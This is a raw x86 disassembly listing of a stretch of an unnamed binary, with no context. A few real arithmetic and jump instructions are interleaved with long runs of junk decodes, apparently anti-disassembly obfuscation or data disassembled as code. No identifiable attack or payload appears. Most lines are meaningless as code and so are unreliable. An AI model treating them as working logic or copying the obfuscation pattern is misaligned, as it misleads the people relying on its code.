  404217:	les    ebp,FWORD PTR [edx+eax*2+0x2a48d30e]
  40421e:	and    DWORD PTR [ecx-0x3ecc5f1e],esi
  404224:	add    eax,esi
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0xa6c1b235
  404243:	and    esi,DWORD PTR [eax+ebx*1]
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x4042be
  40424d:	add    al,0x2b
  40424f:	imul   ebp,edi,0xbcc9271d
  404255:	push   0xffffffb7
  404257:	adc    eax,0x8c4c30df
  40425c:	add    BYTE PTR [eax-0x57],bh
  40425f:	inc    edi
  404260:	and    ebp,DWORD PTR [ecx-0x565f4133]
  404266:	cmp    esp,ecx
  404268:	cs add esp,edi
  40426b:	out    dx,al
  40426c:	push   ebp
  40426d:	push   0xf6bcc8d0
  404272:	sub    ah,BYTE PTR [ebx-0x26]
  404275:	or     al,BYTE PTR [ebx-0x66]
  404278:	push   ecx
  404279:	push   0xffffff84
  40427b:	mov    ah,0x3b
  40427d:	and    al,0xfe
  40427f:	push   0x8ef9dbc3
  404284:	inc    esp
  404285:	dec    esi
  404286:	stos   DWORD PTR es:[edi],eax
  404287:	add    ebx,DWORD PTR [esi]
  404289:	loope  0x40421e
  40428b:	pop    edx
  40428c:	adc    esi,DWORD PTR [edx-0x80]
  40428f:	mov    esp,0x244e4ad6
  404294:	mov    eax,0x293b5c8d
  404299:	ror    DWORD PTR [edi-0x2acc7741],1
  40429f:	arpl   WORD PTR ds:0x9317cd42,ax
  4042a5:	xor    eax,0x97f92e11
  4042aa:	mov    ch,0xd1
  4042ac:	lods   eax,DWORD PTR ds:[esi]
  4042ad:	inc    edi
  4042ae:	sbb    edx,DWORD PTR [eax+eax*8-0x7a1f226b]
  4042b5:	test   eax,0xe96b347d
  4042ba:	lods   al,BYTE PTR ds:[esi]
  4042bb:	test   BYTE PTR [esi-0x21],0x19
  4042bf:	call   0x10ca3f
  4042c4:	cli    
  4042c5:	(bad)  
  4042c6:	sub    eax,0x51721894
  4042cb:	cmp    al,BYTE PTR [edx+0xe]
  4042ce:	inc    ebp
  4042cf:	mov    ch,0x89
  4042d1:	pop    ds
  4042d2:	out    dx,eax
  4042d3:	cs xor al,0xe7
  4042d6:	sub    esp,DWORD PTR [eax-0x26]
  4042d9:	and    esi,edx
  4042db:	pop    ecx
  4042dc:	js     0x40427a
  4042de:	mov    bh,0x5e
  4042e0:	add    ecx,DWORD PTR [ecx-0x7ec69161]
  4042e6:	or     ecx,DWORD PTR [edi+0x3e1ec837]
  4042ec:	daa    
  4042ed:	push   0x22
  4042ef:	push   ebp
  4042f0:	dec    edx
  4042f1:	in     eax,dx
  4042f2:	(bad)  [ebp-0x6b]
  4042f5:	ins    BYTE PTR es:[edi],dx
  4042f6:	xchg   ebp,eax
  4042f7:	inc    esp
  4042f8:	shr    dl,cl
  4042fa:	mov    bh,0x38
  4042fc:	loope  0x404377
  4042fe:	or     BYTE PTR [edx+0x53],cl
  404301:	fwait
  404302:	mov    dh,0xfc
  404304:	imul   ebx,DWORD PTR [ebx+0x10d87b63],0x55
  40430b:	loop   0x404299
  40430d:	pop    edx
  40430e:	popa   
  40430f:	pushf  
  404310:	or     dh,ah
  404312:	pop    edx
  404313:	hlt    
  404314:	add    DWORD PTR ds:0xe2b16486,edi
  40431a:	ror    edi,1
  40431c:	addr16 pop ebp
  40431e:	dec    esp
  40431f:	out    0x7c,al
  404321:	lods   eax,DWORD PTR ds:[esi]
  404322:	enter  0x6a9d,0xa7
  404326:	das    
  404327:	fbstp  TBYTE PTR [ecx-0x6]
  40432a:	jo     0x4042ca
  40432c:	jg     0x4042c9
  40432e:	mov    BYTE PTR ds:0xf83d0147,bh
  404334:	sahf   
  404335:	add    al,BYTE PTR [ecx+0x62]
  404338:	dec    ecx
  404339:	sub    DWORD PTR [edx],ecx
  40433b:	sahf   
  40433c:	dec    edi
  40433d:	out    0xec,al
  40433f:	fs push edx
  404341:	mov    WORD PTR [eax+ebp*8+0xb188cf8],ss
  404348:	jg     0x404358
  40434a:	imul   BYTE PTR [ebx]
  40434c:	xchg   cx,ax
  40434e:	into   
  40434f:	ret    
  404350:	pop    edx
  404351:	(bad)  
  404352:	push   esi
  404353:	das    
  404354:	int    0x94
  404356:	(bad)  
  404357:	jae    0x404357
  404359:	inc    edx
  40435a:	int3   
  40435b:	or     ch,BYTE PTR [edi]
  40435d:	push   esp
  40435e:	or     eax,0x5f7586f8
  404363:	push   ss
  404364:	push   eax
  404365:	sbb    DWORD PTR [esi],edi
  404367:	push   ss
  404368:	sbb    DWORD PTR [ecx],edi
  40436a:	repz (bad) 
  40436c:	mov    bh,0xd9
  40436e:	lock jb 0x40437b
  404371:	push   ss
  404372:	mov    ah,0x9d
  404374:	mov    DWORD PTR [ebp+0x8],eax
  404377:	mov    eax,DWORD PTR [ebp+0x8]
  40437a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40437e:	mov    dl,BYTE PTR [ebp-0x1]
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	ror    DWORD PTR [edx],cl
  4043a2:	test   DWORD PTR [ebp+0x7027dce6],edi
  4043a8:	jo     0x4043c2
  4043aa:	jg     0x40441c
  4043ac:	jo     0x404396
  4043ae:	loopne 0x404345
  4043b0:	xlat   BYTE PTR ds:[ebx]
  4043b1:	push   eax
  4043b2:	xchg   ebp,eax
  4043b3:	jmp    0x404423
  4043b5:	sub    DWORD PTR [edi+0x3799decd],ecx
  4043bb:	bound  esi,QWORD PTR [ebp-0x20]
  4043be:	test   bh,bl
  4043c0:	dec    ecx
  4043c1:	mov    ebx,0x9eaf04cd
  4043c6:	xor    al,0x30
  4043c8:	pop    edi
  4043c9:	scas   al,BYTE PTR es:[edi]
  4043ca:	ror    BYTE PTR [ebp-0x79],cl
  4043cd:	dec    esi
  4043ce:	xchg   ebp,eax
  4043cf:	or     DWORD PTR [esi],esp
  4043d1:	jns    0x4043b9
  4043d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d4:	sti    
  4043d5:	and    edx,DWORD PTR [bp+di]
  4043d8:	cmp    DWORD PTR [ebp+0x5922cd32],0xd74e8b48
  4043e2:	xchg   edx,eax
  4043e3:	out    0x68,al
  4043e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e6:	jb     0x4043ee
  4043e8:	scas   eax,DWORD PTR es:[edi]
  4043e9:	sbb    DWORD PTR [ecx+ebx*2-0x31],0xd4645ae3
  4043f1:	aas    
  4043f2:	cld    
  4043f3:	sub    esi,edi
  4043f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f6:	xchg   ebx,eax
  4043f7:	mov    DWORD PTR [esi+0x24],esp
  4043fa:	jb     0x404458
  4043fc:	push   ecx
  4043fd:	jno    0x404456
  4043ff:	xchg   edi,eax
  404400:	xchg   BYTE PTR [edx],bl
  404402:	push   esi
  404403:	add    eax,0xcd53f347
  404408:	pop    ss
  404409:	ret    0x122d
  40440c:	hlt    
  40440d:	mov    WORD PTR [ecx],fs
  40440f:	mov    ds:0xf9bfefc2,eax
  404414:	mov    esp,0xddb1f9fd
  404419:	inc    esi
  40441a:	test   DWORD PTR [eax+0x1cf3b8b8],eax
  404420:	call   0x685a:0xd203dc43
  404427:	or     eax,0x7a31ed7a
  40442c:	sbb    ah,BYTE PTR [edx]
  40442e:	retf   
  40442f:	jg     0x4043ea
  404431:	cs push cs
  404433:	fcmove st,st(0)
  404435:	cwde   
  404436:	scas   al,BYTE PTR es:[edi]
  404437:	pop    eax
  404438:	jbe    0x40443c
  40443a:	xchg   edx,eax
  40443b:	mov    eax,ds:0x385c6b5e
  404440:	cmp    al,0xf1
  404442:	dec    edi
  404443:	lods   eax,DWORD PTR ds:[esi]
  404444:	ins    BYTE PTR es:[edi],dx
  404445:	mov    eax,0x15bb8a11
  40444a:	and    cl,BYTE PTR [edi-0x72]
  40444d:	xchg   esp,eax
  40444e:	add    dh,BYTE PTR [edx+0x5e]
  404451:	push   ebx
  404452:	in     al,0x6d
  404454:	lods   eax,DWORD PTR ds:[esi]
  404455:	push   esi
  404456:	imul   ebx,DWORD PTR [eax+0x2130cd98],0xc24a24a6
  404460:	dec    ebp
  404461:	call   0x91d:0xab6bf9d0
  404468:	lods   eax,DWORD PTR ds:[esi]
  404469:	or     DWORD PTR [esi+ebp*8-0x7cf71bfa],edx
  404470:	xchg   BYTE PTR [ecx],bl
  404472:	and    BYTE PTR [edx+0x51],al
  404475:	rol    BYTE PTR [eax+0x381c2785],0x4
  40447c:	cmc    
  40447d:	out    dx,eax
  40447e:	mov    bl,BYTE PTR [edx]
  404480:	adc    edi,DWORD PTR [si-0x78]
  404484:	jae    0x404487
  404486:	aam    0x41
  404488:	inc    esi
  404489:	je     0x40443d
  40448b:	xor    DWORD PTR [ebx+eax*2-0x5d],0x3
  404490:	(bad)  
  404491:	cmc    
  404492:	retf   0xed09
  404495:	or     al,BYTE PTR [edx]
  404497:	lods   al,BYTE PTR ds:[esi]
  404498:	pop    esp
  404499:	xor    al,BYTE PTR [esi+0x3b032e63]
  40449f:	fisttp DWORD PTR [edi-0x145db781]
  4044a5:	dec    esp
  4044a6:	(bad)  
  4044a7:	pop    ebx
  4044a8:	in     eax,dx
  4044a9:	jecxz  0x4044b9
  4044ab:	popa   
  4044ac:	xor    BYTE PTR [esi+0x7877c8c5],bh
  4044b2:	fcom   QWORD PTR [edi-0x5b]
  4044b5:	inc    ecx
  4044b6:	adc    esp,DWORD PTR [edx]
  4044b8:	rol    BYTE PTR [edi+0x4eea42a],1
  4044be:	adc    esi,DWORD PTR [ebx]
  4044c0:	sub    al,0xee
  4044c2:	dec    edi
  4044c3:	mov    al,0xe2
  4044c5:	rep stos DWORD PTR es:[edi],eax
  4044c7:	test   DWORD PTR [esi-0x259d8436],ebp
  4044cd:	enter  0xd6d,0x1f
  4044d1:	and    ah,BYTE PTR [ecx-0x1c]
  4044d4:	cmp    eax,0x3a0c558b
  4044d9:	add    cl,BYTE PTR [edi]
  4044db:	test   edi,ebp
  4044dd:	pop    es
  4044de:	add    BYTE PTR [eax],al
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x40456f
  4044f5:	push   esi
  4044f6:	pop    edi
  4044f7:	add    DWORD PTR [esi+eiz*1+0x7f187070],eax
  4044fe:	jo     0x404570
  404500:	(bad)  
  404502:	push   es
  404503:	ds push 0xd5a6ef5f
  404509:	inc    edx
  40450a:	nop
  40450b:	pop    esp
  40450c:	cwde   
  40450d:	test   al,0x80
  40450f:	ins    DWORD PTR es:[edi],dx
  404510:	lds    edi,FWORD PTR [edi+ebx*2]
  404513:	das    
  404514:	scas   eax,DWORD PTR es:[edi]
  404515:	xchg   edx,eax
  404516:	ins    BYTE PTR es:[edi],dx
  404517:	xchg   edx,eax
  404518:	inc    edi
  404519:	test   eax,0xd4275e7d
  40451e:	fisub  WORD PTR [ebx+0x275d6a7e]
  404524:	adc    ebx,edi
  404526:	daa    
  404527:	lds    edx,FWORD PTR [esi]
  404529:	jg     0x404563
  40452b:	pop    esp
  40452c:	or     BYTE PTR [edx],cl
  40452e:	repz and eax,0x7ca1b707
  404534:	fisub  WORD PTR fs:0x7085d289
  40453b:	out    0xf6,al
  40453d:	xor    BYTE PTR [esp+ecx*4+0x37],ch
  404541:	push   edi
  404542:	push   0x33
  404544:	sbb    DWORD PTR [ebx+0x5cfc593d],ecx
  40454a:	mov    dl,0x15
  40454c:	out    dx,al
  40454d:	mov    DWORD PTR [ebx-0x5],0xa71ce1c3
  404554:	jmp    0xdaea:0xc3c8802
  40455b:	add    edx,DWORD PTR [ebp+0x3979ef70]
  404561:	dec    eax
  404562:	or     ah,ch
  404564:	sub    eax,DWORD PTR [ebp-0x5b]
  404567:	aam    0xcd
  404569:	xor    eax,0xccc7aa1b
  40456e:	loopne 0x4044f8
  404570:	mov    eax,0x1807abdf
  404575:	jp     0x404518
  404577:	out    0x3b,eax
  404579:	not    al
  40457b:	dec    ebp
  40457c:	cdq    
  40457d:	add    DWORD PTR [ebp+0x25],0x47b221b9
  404584:	rcr    DWORD PTR [edx+edi*8],0xd1
  404588:	push   ds
  404589:	sub    ah,BYTE PTR [ecx+0x65]
  40458c:	inc    edx
  40458d:	mov    ax,ds:0x8d054ab3
  404593:	sbb    al,dh
  404595:	call   0x3227:0x659471bb
  40459c:	arpl   WORD PTR [ecx+0x40f6b20b],dx
  4045a2:	mov    ch,0xf4
  4045a4:	cld    
  4045a5:	fdivr  st,st(6)
  4045a7:	mov    fs,ebx
  4045a9:	sub    edi,edi
  4045ab:	outs   dx,BYTE PTR ds:[esi]
  4045ac:	bnd jno 0x4045b5
  4045af:	sbb    eax,0x19e46f11
  4045b4:	mov    edx,0x4e7e5b5b
  4045b9:	repz sbb al,0xa0
  4045bc:	in     eax,dx
  4045bd:	and    ebp,DWORD PTR ds:[edx]
  4045c0:	jecxz  0x4045b3
  4045c2:	or     DWORD PTR [esp+ebp*8+0x3d],0x3f
  4045c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045c8:	aam    0x93
  4045ca:	test   BYTE PTR [eax],al
  4045cc:	sbb    BYTE PTR [ebx+ebp*2],dl
  4045cf:	ss inc edx
  4045d1:	popf   
  4045d2:	or     esi,DWORD PTR [ecx+0x6c]
  4045d5:	xchg   ebp,eax
  4045d6:	push   es
  4045d7:	xor    BYTE PTR [ecx+0x4c],dh
  4045da:	repnz mov ch,0x97
  4045dd:	xchg   DWORD PTR ds:0x6a38b0ba,edx
  4045e3:	cli    
  4045e4:	pop    edi
  4045e5:	pusha  
  4045e6:	pop    esp
  4045e7:	jecxz  0x404641
  4045e9:	iret   
  4045ea:	or     bl,BYTE PTR [ecx-0x10c8e56c]
  4045f0:	sub    ah,BYTE PTR [eax+esi*4]
  4045f3:	inc    ebp
  4045f4:	add    eax,0xb209d442
  4045f9:	mov    esi,0xa1b3c618
  4045fe:	(bad)  
  4045ff:	xchg   di,ax
  404601:	xchg   esi,eax
  404602:	lds    edx,FWORD PTR [edi+0x2b]
  404605:	test   eax,0xc6ae1050
  40460a:	shl    BYTE PTR [esp+edi*2+0x6975325],0xf9
  404612:	hlt    
  404613:	sbb    dh,BYTE PTR [edx+edx*1-0x58]
  404617:	test   BYTE PTR [ebx-0x2ee6cec8],al
  40461d:	lods   al,BYTE PTR ds:[esi]
  40461e:	xchg   bl,ch
  404620:	es stos DWORD PTR es:[edi],eax
  404622:	jb     0x40466c
  404624:	pop    esi
  404625:	mov    dl,0x1b
  404627:	cmp    DWORD PTR [ebx-0x41f0f3ab],ecx
  40462d:	adc    dh,BYTE PTR [ebx]
  40462f:	rol    DWORD PTR [ebx],0xc6
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0x16f56c86
  404647:	xchg   DWORD PTR [esp+ebp*4],edi
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	sub    eax,0xf9f8ebb9
  404656:	fmul   QWORD PTR [edi]
  404658:	or     DWORD PTR [esi-0x75f84821],ebx
  40465e:	test   BYTE PTR [ecx],ah
  404660:	cmp    DWORD PTR [edi-0x60b2f164],0xa3869e61
  40466a:	fidivr DWORD PTR [ebx-0x40a91422]
  404670:	sahf   
  404671:	cmp    ecx,DWORD PTR [edi+0x4057fb99]
  404677:	cmp    al,0x62
  404679:	outs   dx,BYTE PTR ds:[esi]
  40467a:	dec    esp
  40467b:	jp     0x40462b
  40467d:	lock loop 0x40461a
  404680:	or     eax,0xc49e0df
  404685:	scas   eax,DWORD PTR es:[edi]
  404686:	dec    ecx
  404687:	mov    eax,ds:0x41c8d97d
  40468c:	(bad)  
  40468d:	(bad)  
  40468e:	mov    dh,0xb3
  404690:	pop    eax
  404691:	xor    eax,0x2a94492f
  404696:	xchg   ebp,eax
  404697:	inc    eax
  404698:	fisub  DWORD PTR [esi+esi*1-0x4e]
  40469c:	mov    esi,0x4ab079a9
  4046a1:	ror    BYTE PTR [edx-0x52],cl
  4046a4:	xchg   ebp,eax
  4046a5:	jne    0x4046f3
  4046a7:	or     al,0x21
  4046a9:	jmp    0x404699
  4046ab:	cmp    DWORD PTR [ebx+0x1c],ebp
  4046ae:	das    
  4046af:	ja     0x40468d
  4046b1:	xor    edi,ebp
  4046b3:	mov    edi,0x745246a8
  4046b8:	or     eax,0x800fd16d
  4046bd:	push   es
  4046be:	lds    edi,FWORD PTR [edx]
  4046c0:	jmp    FWORD PTR [edx+esi*8-0x260206bb]
  4046c7:	inc    ecx
  4046c8:	test   al,0x21
  4046ca:	mov    eax,gs:0x82fc8c65
  4046d0:	nop
  4046d1:	gs push ecx
  4046d3:	cdq    
  4046d4:	daa    
  4046d5:	dec    ebp
  4046d6:	xlat   BYTE PTR ds:[ebx]
  4046d7:	xlat   BYTE PTR ds:[ebx]
  4046d8:	xchg   edi,eax
  4046d9:	aas    
  4046da:	(bad)  
  4046db:	push   cs
  4046dc:	outs   dx,DWORD PTR ds:[esi]
  4046dd:	sahf   
  4046de:	call   DWORD PTR [ebx]
  4046e0:	fcom   DWORD PTR [edx+0x3a0a6d6a]
  4046e6:	retf   
  4046e7:	int    0xa9
  4046e9:	mov    WORD PTR [ecx-0x30],?
  4046ec:	out    dx,al
  4046ed:	es cmp eax,0x8a270466
  4046f3:	and    BYTE PTR [edi-0x69937398],dl
  4046f9:	jl     0x4046f9
  4046fb:	call   0xc281:0xe2e4679c
  404702:	push   ss
  404703:	dec    edi
  404704:	(bad)  
  404705:	gs sahf 
  404707:	std    
  404708:	push   esi
  404709:	in     eax,dx
  40470a:	popf   
  40470b:	mov    ?,WORD PTR [esi-0x51]
  40470e:	inc    esi
  40470f:	daa    
  404710:	mov    gs,WORD PTR [edx+0x1d]
  404713:	mov    ch,0x2
  404715:	mov    dl,0xce
  404717:	cmp    al,dl
  404719:	add    al,0x6e
  40471b:	imul   esp
  40471d:	and    eax,DWORD PTR [esi]
  40471f:	leave  
  404720:	inc    esp
  404721:	add    BYTE PTR [ebp-0x630912d8],0xc8
  404728:	ss (bad) 
  40472a:	or     esp,DWORD PTR [edx]
  40472c:	jae    0x4046d1
  40472e:	shl    DWORD PTR [ebx+eax*8+0x21],0xa8
  404733:	addr16 addr16 out 0x7f,al
  404737:	adc    DWORD PTR [esi-0x7],ebx
  40473a:	pop    esp
  40473b:	out    0x15,eax
  40473d:	jge    0x404717
  40473f:	fdiv   QWORD PTR [esi]
  404741:	das    
  404742:	enter  0x3f31,0xc
  404746:	add    DWORD PTR [esi],edx
  404748:	arpl   WORD PTR [esi+eiz*4+0x63],si
  40474c:	call   0xa5d9:0xb3452649
  404753:	pop    eax
  404754:	ins    DWORD PTR es:[edi],dx
  404755:	cmp    ch,BYTE PTR [edi-0x21ae0d42]
  40475b:	and    al,BYTE PTR [ebx-0x66]
  40475e:	call   DWORD PTR [edx+eax*2]
  404761:	pushf  
  404762:	sub    eax,0xaf54f9b9
  404767:	imul   ebp,ebx,0xc8d48f8
  40476d:	push   ebx
  40476e:	xchg   ebx,eax
  40476f:	mov    ds:0xeae1e9fb,eax
  404774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404775:	cmc    
  404776:	jb     0x40479e
  404778:	mov    ebx,0x3ff840f
  40477d:	add    BYTE PTR [eax],al
  40477f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	retf   
  404798:	and    BYTE PTR [esi],cl
  40479a:	clc    
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x40474d
  4047a4:	je     0x404802
  4047a6:	jns    0x40472d
  4047a8:	push   edx
  4047a9:	sahf   
  4047aa:	dec    ecx
  4047ab:	mov    edi,0x51bb90c5
  4047b0:	mov    eax,0x44c92142
  4047b5:	test   al,0xac
  4047b7:	and    eax,0xdded0401
  4047bc:	jmp    0x404824
  4047be:	popa   
  4047bf:	aas    
  4047c0:	mov    WORD PTR ds:0xd5adee66,?
  4047c6:	std    
  4047c7:	retf   0xf6d8
  4047ca:	icebp  
  4047cb:	outs   dx,DWORD PTR cs:[esi]
  4047cd:	popf   
  4047ce:	pop    eax
  4047cf:	test   DWORD PTR [eax*8+0x555f8090],edx
  4047d6:	sub    esi,ebp
  4047d8:	dec    edx
  4047d9:	adc    esp,DWORD PTR [ebx]
  4047db:	mov    es,ebx
  4047dd:	mov    eax,0xa53f612a
  4047e2:	xchg   ecx,eax
  4047e3:	sub    eax,0xa96e83c8
  4047e8:	inc    ebx
  4047e9:	dec    edx
  4047ea:	sub    BYTE PTR [esi],al
  4047ec:	nop
  4047ed:	outs   dx,BYTE PTR ds:[esi]
  4047ee:	xor    ah,BYTE PTR [edx+0xfec41cf]
  4047f4:	mov    eax,0x77a8116f
  4047f9:	jle    0x4047cd
  4047fb:	lods   al,BYTE PTR ds:[esi]
  4047fc:	push   cs
  4047fd:	add    DWORD PTR [ebx+0x2609016a],0xffffffd1
  404804:	pop    ss
  404805:	in     al,0xa7
  404807:	or     cl,bl
  404809:	out    0xbe,eax
  40480b:	add    ecx,DWORD PTR [edi]
  40480d:	dec    ecx
  40480e:	jmp    0xf291311a
  404813:	shl    BYTE PTR ss:[ebx-0xb],cl
  404817:	and    BYTE PTR [ecx+0x8],0xb9
  40481b:	jmp    0x6821a606
  404820:	jbe    0x404814
  404822:	jl     0x40486b
  404824:	neg    BYTE PTR [eax+0x30e3a474]
  40482a:	mov    edx,0x90bf5fb6
  40482f:	add    DWORD PTR [esi-0x73],ebx
  404832:	dec    edx
  404833:	push   ss
  404834:	mov    dh,0xbf
  404836:	and    esi,ebx
  404838:	jge    0x404808
  40483a:	rcr    DWORD PTR [edi+eax*4+0x39],cl
  40483e:	lea    esp,[ecx]
  404840:	jmp    0xa640:0xbfbce1b5
  404847:	mov    DWORD PTR [ecx+ebp*1+0x297834de],eax
  40484e:	test   DWORD PTR [edi+0x8d4c55b],edx
  404854:	jp     0x4047d7
  404856:	or     al,0xaf
  404858:	push   esp
  404859:	sub    al,0xdf
  40485b:	popa   
  40485c:	pop    esp
  40485d:	lahf   
  40485e:	ror    ebp,1
  404860:	mov    ds:0xd53b2154,al
  404865:	mov    bl,0x2e
  404867:	or     al,0xe8
  404869:	cmp    al,ch
  40486b:	add    DWORD PTR [edx],ebx
  40486d:	jecxz  0x40482f
  40486f:	dec    ebp
  404870:	fmulp  st(4),st
  404872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404873:	jmp    0x4048d0
  404875:	gs inc edi
  404877:	push   ebp
  404878:	lahf   
  404879:	pop    ds
  40487a:	fdivp  st(5),st
  40487c:	ror    BYTE PTR ds:0x2fea8c8,0x6c
  404883:	cmp    esp,ebx
  404885:	dec    ebx
  404886:	fisttp DWORD PTR [ecx]
  404888:	sti    
  404889:	xchg   edx,eax
  40488a:	mov    esp,0xa831cec9
  40488f:	cmp    al,0xc9
  404891:	mov    edx,0x2fa532ab
  404896:	cli    
  404897:	mov    esp,0xd6df5ea5
  40489c:	xor    BYTE PTR [ebp-0x33e8bc02],0x2d
  4048a3:	lods   eax,DWORD PTR ds:[esi]
  4048a4:	sub    eax,0xa4882d5c
  4048a9:	iret   
  4048aa:	xor    BYTE PTR [ebx+edx*2-0x7d],0x4
  4048af:	cmp    edi,DWORD PTR [edx+0x75]
  4048b2:	(bad)  
  4048b3:	mov    edi,0xbb5903bb
  4048b8:	or     al,0xb8
  4048ba:	and    dh,cl
  4048bc:	cmp    bl,BYTE PTR [edi-0x5c2f4af8]
  4048c2:	inc    edx
  4048c3:	xchg   DWORD PTR [ecx],eax
  4048c5:	imul   ah
  4048c7:	pop    eax
  4048c8:	ds jbe 0x40487f
  4048cb:	lea    eax,[ebp-0x18]
  4048ce:	mov    DWORD PTR [ebp-0x14],eax
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0x6387209b
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x404956
  40490a:	stos   DWORD PTR es:[edi],eax
  40490b:	cmp    DWORD PTR [eax-0x6],ebp
  40490e:	cmp    DWORD PTR [edi+0x66],esp
  404911:	ror    DWORD PTR [ebx-0x24],0xb7
  404915:	or     bh,dh
  404917:	mov    eax,0x6f5ac96
  40491c:	fmul   st(4),st
  40491e:	jb     0x4048f2
  404920:	aad    0x4a
  404922:	ret    
  404923:	aad    0xff
  404925:	ins    BYTE PTR es:[edi],dx
  404926:	adc    bh,BYTE PTR [eax-0x4e]
  404929:	cdq    
  40492a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40492b:	jnp    0x4048db
  40492d:	pusha  
  40492e:	mov    dh,0x31
  404930:	cmp    ebp,0x14
  404933:	mov    esp,0xe1cffd32
  404938:	mov    ch,0xd1
  40493a:	je     0x404980
  40493c:	or     eax,0xa25a543e
  404941:	bound  edi,QWORD PTR gs:[ebp+0x2a916fe3]
  404948:	fidiv  WORD PTR [eax-0x67]
  40494b:	jl     0x40493e
  40494d:	xor    edi,edx
  40494f:	or     DWORD PTR [ebp-0xdfa6a11],0x41
  404956:	add    cl,0x51
  404959:	bound  eax,QWORD PTR [ecx-0x30]
  40495c:	and    esi,DWORD PTR [esp+esi*1]
  40495f:	lahf   
  404960:	into   
  404961:	lock dec esp
  404963:	mov    ds:0x4579cf95,eax
  404968:	and    DWORD PTR [ebx],0xffffffb3
  40496b:	addr16 xchg esi,eax
  40496d:	and    ebp,ecx
  40496f:	scas   eax,DWORD PTR es:[edi]
  404970:	xchg   esi,eax
  404971:	(bad)  
  404972:	out    0xcb,al
  404974:	jecxz  0x404966
  404976:	clc    
  404977:	into   
  404978:	call   0x9847:0x88200793
  40497f:	fist   WORD PTR [eax+0x43]
  404982:	aad    0x1e
  404984:	lea    esp,[ebx]
  404986:	into   
  404987:	or     eax,0x19724203
  40498c:	in     al,0x62
  40498e:	cmp    al,0xd8
  404990:	xor    ah,BYTE PTR [esi+0x33]
  404993:	pop    es
  404994:	dec    eax
  404995:	scas   al,BYTE PTR es:[edi]
  404996:	dec    ecx
  404997:	cmp    BYTE PTR [ebx],ah
  404999:	cmp    eax,0x2536dbd4
  40499e:	dec    ax
  4049a0:	les    edi,FWORD PTR [edi+0x3f44eb32]
  4049a6:	not    BYTE PTR [esi-0x38c51ce7]
  4049ac:	mul    BYTE PTR [ebp+0x734788d5]
  4049b2:	xchg   esi,eax
  4049b3:	pop    ecx
  4049b4:	jo     0x404a30
  4049b6:	outs   dx,DWORD PTR ds:[esi]
  4049b7:	sbb    eax,0xbd47e925
  4049bc:	xor    BYTE PTR [ecx-0x5c7e7e8d],ah
  4049c2:	adc    DWORD PTR [eax],edi
  4049c4:	sti    
  4049c5:	addr16 mov edx,0xfbc40755
  4049cb:	xor    eax,esi
  4049cd:	sub    BYTE PTR [eax-0x6a],cl
  4049d0:	mov    WORD PTR [esi-0x1a],gs
  4049d3:	inc    ebx
  4049d4:	scas   al,BYTE PTR es:[edi]
  4049d5:	pop    edi
  4049d6:	and    edi,DWORD PTR [edi+0x4e]
  4049d9:	dec    ecx
  4049da:	jmp    0x4ed:0x235985ab
  4049e1:	add    DWORD PTR [eax+eiz*2+0x152c9df0],edi
  4049e8:	adc    al,0xfb
  4049ea:	push   ecx
  4049eb:	xchg   edx,eax
  4049ec:	mov    WORD PTR [eax],cs
  4049ee:	test   esi,0x99461c87
  4049f4:	loop   0x404a70
  4049f6:	adc    al,0x4f
  4049f8:	popa   
  4049f9:	imul   edx,DWORD PTR [ecx-0x2cba2e82],0xcd42ef9e
  404a03:	lods   eax,DWORD PTR ds:[esi]
  404a04:	jbe    0x4049b3
  404a06:	inc    ebx
  404a07:	cmp    bl,bl
  404a09:	addr16 daa 
  404a0b:	push   cs
  404a0c:	pop    ecx
  404a0d:	cmp    edx,DWORD PTR [edx]
  404a0f:	leave  
  404a10:	xor    al,0xc
  404a12:	pop    ds
  404a13:	jbe    0x4049c0
  404a15:	dec    eax
  404a16:	dec    ecx
  404a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
